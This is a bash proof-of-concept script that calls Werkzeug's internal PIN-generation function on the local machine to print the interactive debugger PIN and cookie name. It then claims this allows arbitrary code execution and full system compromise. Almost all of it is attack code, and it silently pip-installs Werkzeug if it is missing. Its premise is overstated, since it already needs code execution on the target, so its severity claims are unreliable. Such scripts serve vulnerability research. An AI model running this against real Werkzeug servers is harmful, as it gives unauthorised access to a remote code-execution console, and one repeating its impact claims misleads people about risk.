#!/bin/bash
# POC: Werkzeug Debugger PIN Predictable via Direct Function Call
# This script demonstrates how an attacker with local access or ability to run Python
# code on the target system can trivially obtain the Werkzeug debugger PIN

echo "[*] Werkzeug Debugger PIN Extraction POC"
echo "[*] ========================================"
echo ""

# Check if Werkzeug is installed
if ! python3 -c "import werkzeug" 2>/dev/null; then
    echo "[-] Werkzeug not installed. Installing..."
    pip install werkzeug >/dev/null 2>&1
    if [ $? -ne 0 ]; then
        echo "[-] Failed to install Werkzeug"
        exit 1
    fi
fi

echo "[+] Werkzeug detected. Attempting to extract debugger PIN..."
echo ""

# Extract the PIN and cookie name using the vulnerable function
PIN_OUTPUT=$(python3 << 'PYTHON_CODE'
try:
    from werkzeug.debug import get_pin_and_cookie_name
    import os
    
    # The function requires an environ dict and app object
    # When called with minimal parameters, it uses system information
    # to generate the PIN (MAC address, hostname, etc.)
    result = get_pin_and_cookie_name(app=None)
    
    if result:
        pin, cookie = result
        print(f"PIN: {pin}")
        print(f"Cookie: {cookie}")
    else:
        print("Failed to extract PIN")
except Exception as e:
    print(f"Error: {e}")
PYTHON_CODE
)

echo "[*] Result:"
echo "$PIN_OUTPUT"
echo ""

# Verify we got a valid PIN
if echo "$PIN_OUTPUT" | grep -q "PIN:"; then
    PIN=$(echo "$PIN_OUTPUT" | grep "PIN:" | awk '{print $2}')
    COOKIE=$(echo "$PIN_OUTPUT" | grep "Cookie:" | awk '{print $2}')
    
    echo "[+] SUCCESS: PIN extracted: $PIN"
    echo "[+] Cookie extracted: $COOKIE"
    echo ""
    echo "[!] IMPACT: This PIN provides access to the Werkzeug interactive debugger"
    echo "[!]         An attacker can now execute arbitrary Python code via the debugger"
    echo "[!]         This can lead to complete system compromise"
    exit 0
else
    echo "[-] Failed to extract PIN"
    exit 1
fi